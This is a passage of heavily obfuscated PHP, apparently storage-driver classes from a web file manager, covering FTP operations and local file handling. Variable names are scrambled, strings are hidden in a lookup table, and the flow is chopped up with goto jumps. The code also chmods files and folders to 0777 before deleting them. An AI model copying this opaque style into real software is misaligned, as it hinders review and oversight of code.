$this->_login($this->config); } public function mkfile($E´´ÚóÒáß, $E¬•óÒ¼£‚ = '', $bÅè† ´ = REPEAT_RENAME) { if ($this->setContent($E´´ÚóÒáß, $E¬•óÒ¼£‚)) { return $this->getPathOuter($E´´ÚóÒáß); } return !1; } public function mkdir($FéÑëÁªœœ, $EºÚ˜ö¤ñœ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $FéÑëÁªœœ = $this->iconvSystem($FéÑëÁªœœ); if ($this->_isFolder($FéÑëÁªœœ) || @ftp_mkdir($this->connect, $FéÑëÁªœœ)) { return $this->getPathOuter($FéÑëÁªœœ); } if (!$this->mkdir($this->pathFather($FéÑëÁªœœ))) { return !1; } if ($FéÑëÁªœœ = @ftp_mkdir($this->connect, $FéÑëÁªœœ)) { return $this->getPathOuter($FéÑëÁªœœ); } return !1; } public function copyFile($b½é‘à˜ƒÊ, $F®•à¯ÒºÉ) { goto A°ÆÑ¡øÁØ; Fë”äàÖ‘: $cğ×ÈÆŒ†‡ = $this->iconvApp($E¶†Ë¶ÒŞ); $this->download($b½é‘à˜ƒÊ, $cğ×ÈÆŒ†‡); $BçŒ¾¾ÕÅÙ = $this->upload($F®•à¯ÒºÉ, $cğ×ÈÆŒ†‡); goto FÍîƒÍÅ‚; A°ÆÑ¡øÁØ: if (!$this->_isconn()) { return !1; } $FåÉá×Õô¸ = $this->pathThis($this->iconvSystem($b½é‘à˜ƒÊ)); $E¶†Ë¶ÒŞ = $this->tempFile($FåÉá×Õô¸); goto Fë”äàÖ‘; FÍîƒÍÅ‚: $this->tempFileRemve($E¶†Ë¶ÒŞ); return $BçŒ¾¾ÕÅÙ; goto aÄ›’ÅÃ³—; aÄ›’ÅÃ³—: } public function moveFile($e‡³Ò±ò, $cŒÉÂ¢éÒÄ) { if (!$this->_isconn()) { return !1; } $e‡³Ò±ò = $this->iconvSystem($e‡³Ò±ò); $cŒÉÂ¢éÒÄ = $this->iconvSystem($cŒÉÂ¢éÒÄ); $FñôÙñí¢ = @ftp_rename($this->connect, $e‡³Ò±ò, $cŒÉÂ¢éÒÄ); return $FñôÙñí¢ ? $this->getPathOuter($cŒÉÂ¢éÒÄ) : !1; } public function delFile($b–Í¶Û‡) { if (!$this->_isconn()) { return !1; } $b–Í¶Û‡ = $this->iconvSystem($b–Í¶Û‡); return @ftp_delete($this->connect, $b–Í¶Û‡); } public function delFolder($dØ¿‚Êç») { goto A¯³†ªİ¦š; FÄáÆ’†ÌÏ: foreach ($dÂ¬ßÃÁî— as $EË‚«­ƒ‡) { $EË‚«­ƒ‡ = $this->iconvSystem($EË‚«­ƒ‡); $E‚¨õ•İ„² = @ftp_rmdir($this->connect, $EË‚«­ƒ‡); if (!$E‚¨õ•İ„²) { return !1; } } $dØ¿‚Êç» = $this->iconvSystem($dØ¿‚Êç»); return @ftp_rmdir($this->connect, $dØ¿‚Êç»); goto F†©­„¡Éø; b°ËÂÌˆˆ…: $this->fileList($dØ¿‚Êç», $dÂ¬ßÃÁî—, $AÚ¼ƒ³œ­À, !0); $this->listItemCache = !0; foreach ($AÚ¼ƒ³œ­À as $Fé— ğÙï›) { $EË‚«­ƒ‡ = $this->iconvSystem($Fé— ğÙï›[$_SERVER[í¤âËÚ£¶íÊ¢][28]]); $E‚¨õ•İ„² = @ftp_delete($this->connect, $EË‚«­ƒ‡); if (!$E‚¨õ•İ„²) { return !1; } } goto FÄáÆ’†ÌÏ; A¯³†ªİ¦š: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $dÂ¬ßÃÁî— = $AÚ¼ƒ³œ­À = array(); goto b°ËÂÌˆˆ…; F†©­„¡Éø: } public function rename($bĞÚ¼º‡”³, $FˆˆÁ“°Åæ) { goto a‹ªšßùÄÄ; e¿Şƒö‰Ä: $DÌƒ®ÚİóÔ = $this->iconvSystem($DÌƒ®ÚİóÔ); $bĞÚ¼º‡”³ = $this->iconvSystem($bĞÚ¼º‡”³); $FŸ»ŞµÈ = $this->pathFather($bĞÚ¼º‡”³); goto eŠĞïà÷¿; a‹ªšßùÄÄ: $EÌÑò†œ´Ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->_isconn()) { return !1; } $DÌƒ®ÚİóÔ = $this->fileNameAuto($this->pathFather($bĞÚ¼º‡”³), $FˆˆÁ“°Åæ); goto e¿Şƒö‰Ä; Aªİíˆ„½¨: return $eÔ‹³·Ø„Æ ? $this->getPathOuter($a´´öÉ¿š) : !1; goto dÕ’èß­ÌÊ; eŠĞïà÷¿: $a´´öÉ¿š = rtrim($FŸ»ŞµÈ, $EÌÑò†œ´Ê[8]) . $EÌÑò†œ´Ê[8] . $DÌƒ®ÚİóÔ; $eÔ‹³·Ø„Æ = @ftp_rename($this->connect, $bĞÚ¼º‡”³, $a´´öÉ¿š); $a´´öÉ¿š = $this->iconvApp($a´´öÉ¿š); goto Aªİíˆ„½¨; dÕ’èß­ÌÊ: } private function folderInfo($B©îÕÈˆÂ, $bââ¢ ¢×Ã = false) { $CŞ´÷…òù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eŠŸËÖ¯ä = array($CŞ´÷…òù[28] => $this->pathThis($B©îÕÈˆÂ), $CŞ´÷…òù[85] => $this->getPathOuter($CŞ´÷…òù[8] . $B©îÕÈˆÂ), $CŞ´÷…òù[29] => $CŞ´÷…òù[86]); if ($bââ¢ ¢×Ã) { return $eŠŸËÖ¯ä; } $eŠŸËÖ¯ä[$CŞ´÷…òù[202]] = $eŠŸËÖ¯ä[$CŞ´÷…òù[93]] = 0; $eŠŸËÖ¯ä[$CŞ´÷…òù[203]] = $eŠŸËÖ¯ä[$CŞ´÷…òù[204]] = !0; return $eŠŸËÖ¯ä; } private function fileInfo($b“ñÓ„â³, $EŒ‚Æ«ñ ª = false, $f©Ê˜Ôµİ‚ = array()) { goto eòù¾Ôš¬; F‹á¶ÀğÌ°: $CåÆ·®ò [$açäˆ³÷“ó[202]] = $CåÆ·®ò [$açäˆ³÷“ó[93]] = 0; $CåÆ·®ò [$açäˆ³÷“ó[203]] = $CåÆ·®ò [$açäˆ³÷“ó[204]] = !0; $FÊÎ–ÇˆÒ = $this->iconvSystem($b“ñÓ„â³); goto E„™ª¢´è‡; eä¶©Û¨ê: return $CåÆ·®ò ; goto c–ÒÑéİ‹á; eòù¾Ôš¬: $açäˆ³÷“ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CåÆ·®ò  = array($açäˆ³÷“ó[28] => $this->pathThis($b“ñÓ„â³), $açäˆ³÷“ó[85] => $this->getPathOuter($açäˆ³÷“ó[8] . $b“ñÓ„â³), $açäˆ³÷“ó[29] => $açäˆ³÷“ó[201], $açäˆ³÷“ó[87] => isset($f©Ê˜Ôµİ‚[$açäˆ³÷“ó[87]]) ? $f©Ê˜Ôµİ‚[$açäˆ³÷“ó[87]] : 0, $açäˆ³÷“ó[177] => $this->ext($b“ñÓ„â³)); if ($EŒ‚Æ«ñ ª) { return $CåÆ·®ò ; } goto F‹á¶ÀğÌ°; E„™ª¢´è‡: $CåÆ·®ò [$açäˆ³÷“ó[93]] = @ftp_mdtm($this->connect, $FÊÎ–ÇˆÒ); if (empty($f©Ê˜Ôµİ‚)) { $f©Ê˜Ôµİ‚ = $this->objectMeta($b“ñÓ„â³); if (!$f©Ê˜Ôµİ‚) { return $CåÆ·®ò ; } } $CåÆ·®ò [$açäˆ³÷“ó[87]] = $f©Ê˜Ôµİ‚[$açäˆ³÷“ó[87]]; goto eä¶©Û¨ê; c–ÒÑéİ‹á: } public function size($A¤Ò£İºÉ¬) { $d·âËÙ„Æ¨ = $this->objectMeta($A¤Ò£İºÉ¬); return $d·âËÙ„Æ¨ ? $d·âËÙ„Æ¨[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function info($B«ÖäíÑ) { if ($this->isFile($B«ÖäíÑ)) { return $this->fileInfo($B«ÖäíÑ, 0); } else { if ($this->isFolder($B«ÖäíÑ)) { return $this->folderInfo($B«ÖäíÑ); } } return !1; } private function fileList($A¦Æª‡Ÿ¡Î, &$F§§±µ¬îÈ, &$BÌ¤é¯Èš, $b™ä·òºÃè = false) { goto A¸¦ÚØËÅ¥; cÊ¥ÕÂÔêĞ: $D¨°·¥åö“ = $this->listItemCache === !1 ? !1 : !0; $eïº¡ŒˆÚ¯ = @ftp_rawlist($this->connect, $A¦Æª‡Ÿ¡Î); if (!$eïº¡ŒˆÚ¯) { $eïº¡ŒˆÚ¯ = array(); } goto B†œÚË“ä«; B‰Á¶ñ´†: @ftp_chdir($this->connect, $D†“ÕäéßÎ[8]); $A¦Æª‡Ÿ¡Î = rtrim($A¦Æª‡Ÿ¡Î, $D†“ÕäéßÎ[8]) . $D†“ÕäéßÎ[8]; check_abort(); goto cÊ¥ÕÂÔêĞ; B†œÚË“ä«: $dÜÅ¬ïæóì = array($D†“ÕäéßÎ[104] => 1, $D†“ÕäéßÎ[1211] => 1); foreach ($eïº¡ŒˆÚ¯ as $dô˜Ó³ƒ£Ó) { goto f‰Ş„ÜîĞø; DƒóÄŠ“¯: if ($c¼çİ‡Äªµ) { $F§§±µ¬îÈ[] = $d±¿Ò»Àâ÷; if ($b™ä·òºÃè) { $this->fileList($d±¿Ò»Àâ÷, $F§§±µ¬îÈ, $BÌ¤é¯Èš, $b™ä·òºÃè); } continue; } $BÌ¤é¯Èš[] = $A¡‘–Õé·ñ; goto aó­Ó¾é¿ã; b×Ó…ƒãÃò: if (!$d±¿Ò»Àâ÷ || isset($dÜÅ¬ïæóì[$d±¿Ò»Àâ÷])) { continue; } $d±¿Ò»Àâ÷ = $this->iconvApp($A¦Æª‡Ÿ¡Î . ltrim($d±¿Ò»Àâ÷, $D†“ÕäéßÎ[8])); $A¡‘–Õé·ñ = array($D†“ÕäéßÎ[28] => $d±¿Ò»Àâ÷, $D†“ÕäéßÎ[29] => $D†“ÕäéßÎ[201], $D†“ÕäéßÎ[87] => $AÜøãÌæç[4]); goto Bãì‹ÎÈÕâ; Bãì‹ÎÈÕâ: if (substr($dô˜Ó³ƒ£Ó, 0, 1) == $D†“ÕäéßÎ[1212]) { $A¡‘–Õé·ñ[$D†“ÕäéßÎ[29]] = $D†“ÕäéßÎ[86]; $A¡‘–Õé·ñ[$D†“ÕäéßÎ[87]] = 0; } $c¼çİ‡Äªµ = $A¡‘–Õé·ñ[$D†“ÕäéßÎ[29]] == $D†“ÕäéßÎ[86] ? !0 : !1; if ($D¨°·¥åö“) { $this->cacheMethod($D†“ÕäéßÎ[207], $d±¿Ò»Àâ÷, $c¼çİ‡Äªµ); $this->cacheMethod($D†“ÕäéßÎ[208], $d±¿Ò»Àâ÷, $A¡‘–Õé·ñ); } goto DƒóÄŠ“¯; f‰Ş„ÜîĞø: $AÜøãÌæç = $this->_listItem($dô˜Ó³ƒ£Ó); if ($AÜøãÌæç[0] == $D†“ÕäéßÎ[700]) { continue; } $d±¿Ò»Àâ÷ = $AÜøãÌæç[8]; goto b×Ó…ƒãÃò; aó­Ó¾é¿ã: } if ($D¨°·¥åö“) { $this->cacheMethod($D†“ÕäéßÎ[207], $A¦Æª‡Ÿ¡Î, !0); } goto A©¶‹‡è™Ü; A¸¦ÚØËÅ¥: $D†“ÕäéßÎ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¦Æª‡Ÿ¡Î = $this->iconvSystem($A¦Æª‡Ÿ¡Î); if (!$this->isFolder($A¦Æª‡Ÿ¡Î)) { return !1; } goto B‰Á¶ñ´†; A©¶‹‡è™Ü: } private function _listItem($a¿†ß£¥¯) { if (empty($a¿†ß£¥¯)) { return array(); } $eĞ«‡õ†¦ = preg_split($_SERVER[í¤âËÚ£¶íÊ¢][1213], $a¿†ß£¥¯); if (count($eĞ«‡õ†¦) <= 9) { return $eĞ«‡õ†¦; } $eĞ«‡õ†¦[8] = trim(substr($a¿†ß£¥¯, strpos($a¿†ß£¥¯, $eĞ«‡õ†¦[7]) + strlen($eĞ«‡õ†¦[7]))); return array_splice($eĞ«‡õ†¦, 0, 9); } public function listPath($FÏÒŒÌ‹Æ, $b×„ÕÔ¿ = false) { goto B‹˜Š·½–¡; b¯ìøÑæ½˜: $this->fileList($FÏÒŒÌ‹Æ, $e‡ê§Œé˜«, $FÛ°™ôôø³); foreach ($e‡ê§Œé˜« as $FŒ‡µÛ›™ => $D³Ç‹¸ë‡÷) { $e‡ê§Œé˜«[$FŒ‡µÛ›™] = $this->folderInfo($D³Ç‹¸ë‡÷, $b×„ÕÔ¿); } foreach ($FÛ°™ôôø³ as $FŒ‡µÛ›™ => $D³Ç‹¸ë‡÷) { $FÛ°™ôôø³[$FŒ‡µÛ›™] = $this->fileInfo($D³Ç‹¸ë‡÷[$cöÊ™î¿åÁ[28]], $b×„ÕÔ¿, $D³Ç‹¸ë‡÷); } goto cĞª›Ç‘ï©; cĞª›Ç‘ï©: return array($cöÊ™î¿åÁ[84] => $e‡ê§Œé˜«, $cöÊ™î¿åÁ[83] => $FÛ°™ôôø³); goto Eƒ›¢éÛÓõ; B‹˜Š·½–¡: $cöÊ™î¿åÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->_isconn()) { return !1; } $e‡ê§Œé˜« = $FÛ°™ôôø³ = array(); goto b¯ìøÑæ½˜; Eƒ›¢éÛÓõ: } public function has($Eù¿ïÀĞ§¼, $f¨»‰¤÷Ñã = false, $eß´Ùˆ¬ÑÏ = true) { goto Eô«ÏÍéÕ; E‚°¤‡¾…“: $this->fileList($Eù¿ïÀĞ§¼, $B®Ã¬Û¼Ö, $aÁ¡ÔÈå±, $C¬¥„¬); if ($f¨»‰¤÷Ñã) { return array($dã›¼¨ƒŠÒ[211] => count($aÁ¡ÔÈå±), $dã›¼¨ƒŠÒ[212] => count($B®Ã¬Û¼Ö)); } if ($eß´Ùˆ¬ÑÏ) { if (count($aÁ¡ÔÈå±)) { return !0; } } else { if (count($B®Ã¬Û¼Ö)) { return !0; } } goto Bîø©º¢‹; Eô«ÏÍéÕ: $dã›¼¨ƒŠÒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B®Ã¬Û¼Ö = $aÁ¡ÔÈå± = array(); $C¬¥„¬ = $f¨»‰¤÷Ñã ? !0 : !1; goto E‚°¤‡¾…“; Bîø©º¢‹: return !1; goto a°¿¶­ÖÆ; a°¿¶­ÖÆ: } public function listAll($aÑ°ö±›å‹) { goto f´Îæ”–ğ„; A“Á¸Œñ¼: $this->fileList($aÑ°ö±›å‹, $CŒø¯Ê´åš, $fˆŠ ¢·ö, !0); $CŸÊç‰Ê×§ = array(); foreach ($fˆŠ ¢·ö as $bÃÒó‰ÊŞİ) { $CŸÊç‰Ê×§[$bÃÒó‰ÊŞİ[$AâŸó„××[28]]] = $bÃÒó‰ÊŞİ[$AâŸó„××[87]]; } goto eµØàÍÚ—; eµØàÍÚ—: foreach ($CŒø¯Ê´åš as $bÃÒó‰ÊŞİ) { if (is_string($bÃÒó‰ÊŞİ)) { $CŸÊç‰Ê×§[$bÃÒó‰ÊŞİ] = 0; } } return $this->listAllFiles($aÑ°ö±›å‹, array_keys($CŸÊç‰Ê×§), $CŸÊç‰Ê×§); goto B•×†ƒçÅ¼; f´Îæ”–ğ„: $AâŸó„×× =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->_isconn()) { return !1; } $CŒø¯Ê´åš = $fˆŠ ¢·ö = array(); goto A“Á¸Œñ¼; B•×†ƒçÅ¼: } public function getContent($f¢õÕŞ”ğƒ) { if (!$this->_isconn()) { return !1; } $f¢õÕŞ”ğƒ = $this->iconvSystem($f¢õÕŞ”ğƒ); return $this->fileSubstr($f¢õÕŞ”ğƒ); } public function setContent($c’Ï›£šøŠ, $fÕ½Ê¶ãî = '') { goto F‘  æËê; b˜ë¿“¿ŠÙ: return $eÅ®¢–ãì; goto b™Å¬ùŞµ×; F‘  æËê: if (!$this->_isconn()) { return !1; } $f£ìà†ÖÚÀ = $this->pathThis($this->iconvSystem($c’Ï›£šøŠ)); $f†Å„À³ñ­ = $this->tempFile($f£ìà†ÖÚÀ); goto Eºä©ê¯×¡; Eºä©ê¯×¡: file_put_contents($f†Å„À³ñ­, $fÕ½Ê¶ãî); $eÅ®¢–ãì = $this->upload($c’Ï›£šøŠ, $this->iconvApp($f†Å„À³ñ­)); $this->tempFileRemve($f†Å„À³ñ­); goto b˜ë¿“¿ŠÙ; b™Å¬ùŞµ×: } public function fileSubstr($E¥ãÕÔ‹, $Fá¹êˆÌæŒ = 0, $A…ÈÀÕÈ§ª = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E¥ãÕÔ‹, $Fá¹êˆÌæŒ, $A…ÈÀÕÈ§ª); } private function ftpRequest($cµª¬Şœ¶ö, $A‹‚†ØÙÂ = 0, $CÕêª¤‰¦ = false) { goto Cºä‡öœ‡ê; Cˆ¤‡Ûä: return $d‡¥°„¶—î; goto a„ºŸ¥Ñˆ; Cºä‡öœ‡ê: $cµª¬Şœ¶ö = $this->iconvSystem($cµª¬Şœ¶ö); $bÔàä‚ïâ = $this->scheme . $this->host . $_SERVER[í¤âËÚ£¶íÊ¢][4] . $this->port; $BÚßï‘ëÌ = curl_init(); goto cŞÎŒÑÈª³; cŞÎŒÑÈª³: curl_setopt($BÚßï‘ëÌ, CURLOPT_URL, $bÔàä‚ïâ . $this->pathEncode($cµª¬Şœ¶ö)); curl_setopt($BÚßï‘ëÌ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($CÕêª¤‰¦) { $a¬ß¬ÖˆÔ• = $A‹‚†ØÙÂ + $CÕêª¤‰¦ - 1; curl_setopt($BÚßï‘ëÌ, CURLOPT_RANGE, "{$A‹‚†ØÙÂ}\55{$a¬ß¬ÖˆÔ•}"); } goto fÙ¢ß® åç; fÙ¢ß® åç: curl_setopt($BÚßï‘ëÌ, CURLOPT_RETURNTRANSFER, 1); $d‡¥°„¶—î = curl_exec($BÚßï‘ëÌ); curl_close($BÚßï‘ëÌ); goto Cˆ¤‡Ûä; a„ºŸ¥Ñˆ: } public function upload($e®õ¦ÊÇ, $bÆëÏÙ’ˆ–, $Fß„È Ù¬‘ = false, $fÌØ˜ÍÚ = REPEAT_REPLACE) { goto fÇ»Ü¿Äß; C–×Ù”ø¶Ç: $bÆëÏÙ’ˆ– = $this->iconvSystem($bÆëÏÙ’ˆ–); $fÇ£‹‡Ö¶‚ = ftp_nb_put($this->connect, $e®õ¦ÊÇ, $bÆëÏÙ’ˆ–, FTP_BINARY); while ($fÇ£‹‡Ö¶‚ == FTP_MOREDATA) { $fÇ£‹‡Ö¶‚ = ftp_nb_continue($this->connect); } goto D¾ã‰™àª“; fÇ»Ü¿Äß: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($e®õ¦ÊÇ))) { return !1; } $e®õ¦ÊÇ = $this->iconvSystem($e®õ¦ÊÇ); goto C–×Ù”ø¶Ç; D¾ã‰™àª“: if ($fÇ£‹‡Ö¶‚ != FTP_FINISHED) { return !1; } return $this->getPathOuter($e®õ¦ÊÇ); goto a¡’Á—£Ú; a¡’Á—£Ú: } public function download($DÉ¦Ï†„²®, $dñƒ äµ¿Ğ = '') { goto d«µ£ˆ÷; d«µ£ˆ÷: if (!$this->_isconn()) { return !1; } $aÈ»é£‰—† = $this->pathFather($dñƒ äµ¿Ğ); if (!IO::mkdir($aÈ»é£‰—†)) { return !1; } goto FŒÆÀ¬É–Ò; FŒÆÀ¬É–Ò: $DÉ¦Ï†„²® = $this->iconvSystem($DÉ¦Ï†„²®); $dñƒ äµ¿Ğ = $this->iconvSystem($dñƒ äµ¿Ğ); $a¯¯Ñ¶ÓÅ = ftp_nb_get($this->connect, $dñƒ äµ¿Ğ, $DÉ¦Ï†„²®, FTP_BINARY); goto B½ßÛ”®ñš; B½ßÛ”®ñš: while ($a¯¯Ñ¶ÓÅ == FTP_MOREDATA) { $a¯¯Ñ¶ÓÅ = ftp_nb_continue($this->connect); } if ($a¯¯Ñ¶ÓÅ != FTP_FINISHED) { return !1; } return $this->iconvApp($dñƒ äµ¿Ğ); goto D¦·ß¡®…ê; D¦·ß¡®…ê: } public function exist($bõÄ‹ç¸ä–) { return $this->isFile($bõÄ‹ç¸ä–) || $this->isFolder($bõÄ‹ç¸ä–); } public function isFile($Cß¦ç‡–Ğƒ) { return !$this->isFolder($Cß¦ç‡–Ğƒ) && $this->objectMeta($Cß¦ç‡–Ğƒ); } public function isFolder($cÎ¹¼Ğçßƒ) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][207], $cÎ¹¼Ğçßƒ); } protected function objectMeta($aÙ¡·äª¼Ø) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][208], $aÙ¡·äª¼Ø); } protected function _objectMeta($E¹šÆ›‡¿) { goto EŠ†Ğ”‰Ÿø; aêğ‘·Ò’Æ: $E¹šÆ›‡¿ = $this->iconvSystem($E¹šÆ›‡¿); $cÒ¬Î’›â = array($Câ”ç¦ğÙ¹[28] => $this->iconvApp($E¹šÆ›‡¿), $Câ”ç¦ğÙ¹[29] => $Câ”ç¦ğÙ¹[201], $Câ”ç¦ğÙ¹[87] => 0); @ftp_chdir($this->connect, $Câ”ç¦ğÙ¹[8]); goto aÎÃ­‚Âì; aÎÃ­‚Âì: $fĞ¡¸óĞÍ = @ftp_size($this->connect, $E¹šÆ›‡¿); if ($fĞ¡¸óĞÍ != -1) { $cÒ¬Î’›â[$Câ”ç¦ğÙ¹[87]] = $fĞ¡¸óĞÍ; } else { $cåÊˆèÓ–½ = @ftp_chdir($this->connect, $E¹šÆ›‡¿); if (!$cåÊˆèÓ–½) { return !1; } $cÒ¬Î’›â[$Câ”ç¦ğÙ¹[29]] = $Câ”ç¦ğÙ¹[86]; } return $cÒ¬Î’›â; goto Fòí¤Şä¿; EŠ†Ğ”‰Ÿø: $Câ”ç¦ğÙ¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($E¹šÆ›‡¿ == $Câ”ç¦ğÙ¹[33] || $E¹šÆ›‡¿ == $Câ”ç¦ğÙ¹[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto aêğ‘·Ò’Æ; Fòí¤Şä¿: } protected function _isFolder($AŞäÌ¡¬ÛÍ) { $fêŞè……Ì“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($AŞäÌ¡¬ÛÍ == $fêŞè……Ì“[33] || $AŞäÌ¡¬ÛÍ == $fêŞè……Ì“[8]) { return !0; } $E¿ÅçÙ‚Ô½ = $this->_objectMeta($AŞäÌ¡¬ÛÍ); return isset($E¿ÅçÙ‚Ô½[$fêŞè……Ì“[29]]) && $E¿ÅçÙ‚Ô½[$fêŞè……Ì“[29]] == $fêŞè……Ì“[86] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b¨ä…Ô‚Üø) { if (substr($b¨ä…Ô‚Üø, 0, 2) == $_SERVER[í¤âËÚ£¶íÊ¢][1204]) { $b¨ä…Ô‚Üø = BASIC_PATH . substr($b¨ä…Ô‚Üø, 2); } return $b¨ä…Ô‚Üø; } public function iconvApp($Bê«Çá»ÙÁ) { $D†®ˆ¯í½Æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; global $config; return $this->iconvTo($Bê«Çá»ÙÁ, $config[$D†®ˆ¯í½Æ[1202]], $config[$D†®ˆ¯í½Æ[1201]]); } public function iconvSystem($dõƒ‹®Ÿì) { $b›Á¯É­ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; global $config; return $this->iconvTo($dõƒ‹®Ÿì, $config[$b›Á¯É­ç[1201]], $config[$b›Á¯É­ç[1202]]); } public function getPathOuter($F…òí²áÃ©) { goto B”Ğ­Ù‘Å; E¦Î‹ğÎ‰: $F…òí²áÃ© = KodIO::clear($F…òí²áÃ©); $F…òí²áÃ© = substr($F…òí²áÃ©, strlen($eñÀ‘á¯í)); if (empty($this->pathDriver)) { return $F…òí²áÃ©; } goto CÕŞ™äĞ™‚; CÕŞ™äĞ™‚: return $this->pathDriver . $D¹‰Õ¿ÈÆ¿[8] . ltrim($F…òí²áÃ©, $D¹‰Õ¿ÈÆ¿[8]); goto bñ†œŠÜ¶İ; B”Ğ­Ù‘Å: $D¹‰Õ¿ÈÆ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eñÀ‘á¯í = $this->iconvApp($this->pathBase); $F…òí²áÃ© = $this->iconvApp($F…òí²áÃ©); goto B¯¾œï÷œ‚; B¯¾œï÷œ‚: if (substr($eñÀ‘á¯í, 0, 2) == $D¹‰Õ¿ÈÆ¿[1204]) { $eñÀ‘á¯í = BASIC_PATH . substr($eñÀ‘á¯í, 2); } if (substr($F…òí²áÃ©, 0, 2) == $D¹‰Õ¿ÈÆ¿[1204]) { $F…òí²áÃ© = BASIC_PATH . substr($F…òí²áÃ©, 2); } $eñÀ‘á¯í = KodIO::clear($eñÀ‘á¯í); goto E¦Î‹ğÎ‰; bñ†œŠÜ¶İ: } public function mkfile($E×öŒÜ–µ§, $a‡ªˆ¥ˆÛ§ = '', $e¿ĞÊîÈÃá = REPEAT_RENAME) { $E×öŒÜ–µ§ = $this->iconvSystem($E×öŒÜ–µ§); @touch($E×öŒÜ–µ§); if ($a‡ªˆ¥ˆÛ§) { file_put_contents($E×öŒÜ–µ§, $a‡ªˆ¥ˆÛ§); } return is_file($E×öŒÜ–µ§) ? $this->getPathOuter($E×öŒÜ–µ§) : !1; } public function mkdir($AÁ•ïïˆæœ, $AÜ‰’¸îÇ = REPEAT_SKIP) { $AÁ•ïïˆæœ = $this->iconvSystem($AÁ•ïïˆæœ); if (is_dir($AÁ•ïïˆæœ)) { return $this->getPathOuter($AÁ•ïïˆæœ); } @mkdir($AÁ•ïïˆæœ, 511, !0); return is_dir($AÁ•ïïˆæœ) ? $this->getPathOuter($AÁ•ïïˆæœ) : !1; } public function copyFile($BÚĞÁñÆß…, $Aª‹Éƒ¦«ğ) { $this->mkdir($this->pathFather($Aª‹Éƒ¦«ğ)); $BÚĞÁñÆß… = $this->iconvSystem($BÚĞÁñÆß…); $Aª‹Éƒ¦«ğ = $this->iconvSystem($Aª‹Éƒ¦«ğ); $e…ˆ‘‚Ááó = copy_64($BÚĞÁñÆß…, $Aª‹Éƒ¦«ğ); return $e…ˆ‘‚Ááó ? $this->getPathOuter($Aª‹Éƒ¦«ğ) : !1; } public function moveFile($EòÜ«ÊêÌ“, $C‘øË¤Ô¾«) { $this->mkdir($this->pathFather($C‘øË¤Ô¾«)); $EòÜ«ÊêÌ“ = $this->iconvSystem($EòÜ«ÊêÌ“); $C‘øË¤Ô¾« = $this->iconvSystem($C‘øË¤Ô¾«); $b’í‰ˆğ…º = intval(@rename($EòÜ«ÊêÌ“, $C‘øË¤Ô¾«)); if (!$b’í‰ˆğ…º) { if ($b’í‰ˆğ…º = intval(@copy_64($EòÜ«ÊêÌ“, $C‘øË¤Ô¾«))) { @unlink($EòÜ«ÊêÌ“); } } return $b’í‰ˆğ…º ? $this->getPathOuter($C‘øË¤Ô¾«) : !1; } public function delFile($f””ØœìÓ‡) { $f””ØœìÓ‡ = $this->iconvSystem($f””ØœìÓ‡); if (!@unlink($f””ØœìÓ‡)) { @chmod($f””ØœìÓ‡, 511); if (!@unlink($f””ØœìÓ‡)) { return !1; } } else { return !0; } } public function delFolder($Dõ¨Œ“¸êØ) { goto cÖœä‘ô¬¿; cÖœä‘ô¬¿: $D«÷¼”ÌÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dõ¨Œ“¸êØ = $this->iconvSystem($Dõ¨Œ“¸êØ); if (!is_dir($Dõ¨Œ“¸êØ)) { return !0; } goto eŞÁéå™Ú; eŞÁéå™Ú: if (!($e•‡å‹¨óÁ = opendir($Dõ¨Œ“¸êØ))) { return !1; } while (($a§°Ş”Á¥ = readdir($e•‡å‹¨óÁ)) !== !1) { if ($a§°Ş”Á¥ == $D«÷¼”ÌÙ[104] || $a§°Ş”Á¥ == $D«÷¼”ÌÙ[1211]) { continue; } $A“İ‡‡ÑŞè = $Dõ¨Œ“¸êØ . $D«÷¼”ÌÙ[8] . $a§°Ş”Á¥; if (is_file($A“İ‡‡ÑŞè) || is_link($A“İ‡‡ÑŞè)) { if (!unlink($A“İ‡‡ÑŞè)) { chmod($A“İ‡‡ÑŞè, 511); if (!unlink($A“İ‡‡ÑŞè)) { return !1; } } } else { if (is_dir($A“İ‡‡ÑŞè)) { chmod($A“İ‡‡ÑŞè, 511); $A“İ‡‡ÑŞè = $this->iconvApp($A“İ‡‡ÑŞè); if (!$this->delFolder($A“İ‡‡ÑŞè)) { return !1; } } } } closedir($e•‡å‹¨óÁ); goto dî½øñ²; dî½øñ²: return rmdir($Dõ¨Œ“¸êØ); goto bÁÏÀŠ•š´; bÁÏÀŠ•š´: } public function rename($eå¹×ÄîĞ, $cŞÄÉØíÕ™) { goto Açë½ÌŒ¿î; AàÆğïºø: $dß·ÀÄï Ğ = @rename($eå¹×ÄîĞ, $C»˜ŸË¯Í¸); $C»˜ŸË¯Í¸ = $this->iconvApp($C»˜ŸË¯Í¸); return $dß·ÀÄï Ğ ? $this->getPathOuter($C»˜ŸË¯Í¸) : !1; goto a¿Õà‡¼Í; Açë½ÌŒ¿î: $D¹¿¿‘ÃÖ™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÅå¨ñ¨… = $this->fileNameAuto($this->pathFather($eå¹×ÄîĞ), $cŞÄÉØíÕ™); $dÅå¨ñ¨… = $this->iconvSystem($dÅå¨ñ¨…); goto c‹øÒğ¡‰È; c‹øÒğ¡‰È: $eå¹×ÄîĞ = $this->iconvSystem($eå¹×ÄîĞ); $CŒõÎŠß— = 